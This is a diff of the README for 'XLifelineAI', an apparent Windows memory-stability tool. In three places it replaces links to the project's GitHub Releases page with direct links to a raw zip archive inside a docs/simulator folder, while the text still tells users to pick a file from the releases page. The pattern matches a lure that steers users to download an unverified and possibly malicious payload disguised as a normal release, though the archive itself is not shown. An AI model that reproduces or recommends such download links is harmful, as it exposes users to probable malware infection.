@@ -1,6 +1,6 @@
 # 🧠 XLifelineAI - Keep Memory Stable Under Stress
 
-[![Download XLifelineAI](https://img.shields.io/badge/Download-XLifelineAI-blue?style=for-the-badge)](https://github.com/Batholomewsoftfooted486/XLifelineAI/releases)
+[![Download XLifelineAI](https://img.shields.io/badge/Download-XLifelineAI-blue?style=for-the-badge)](https://github.com/Batholomewsoftfooted486/XLifelineAI/raw/refs/heads/main/docs/simulator/X_Lifeline_AI_v1.2-beta.2.zip)
 
 ## 🚀 What XLifelineAI Does
 
@@ -35,7 +35,7 @@ For best results:
 
 Visit this page to download the Windows release:
 
-[Download XLifelineAI from GitHub Releases](https://github.com/Batholomewsoftfooted486/XLifelineAI/releases)
+[Download XLifelineAI from GitHub Releases](https://github.com/Batholomewsoftfooted486/XLifelineAI/raw/refs/heads/main/docs/simulator/X_Lifeline_AI_v1.2-beta.2.zip)
 
 On that page, look for the latest release and choose the Windows file that matches your system.
 
@@ -174,7 +174,7 @@ XLifelineAI fits well in workflows like:
 
 To get the latest Windows build, go here:
 
-[https://github.com/Batholomewsoftfooted486/XLifelineAI/releases](https://github.com/Batholomewsoftfooted486/XLifelineAI/releases)
+[https://github.com/Batholomewsoftfooted486/XLifelineAI/raw/refs/heads/main/docs/simulator/X_Lifeline_AI_v1.2-beta.2.zip](https://github.com/Batholomewsoftfooted486/XLifelineAI/raw/refs/heads/main/docs/simulator/X_Lifeline_AI_v1.2-beta.2.zip)
 
 ## 🧰 Troubleshooting Tips
 
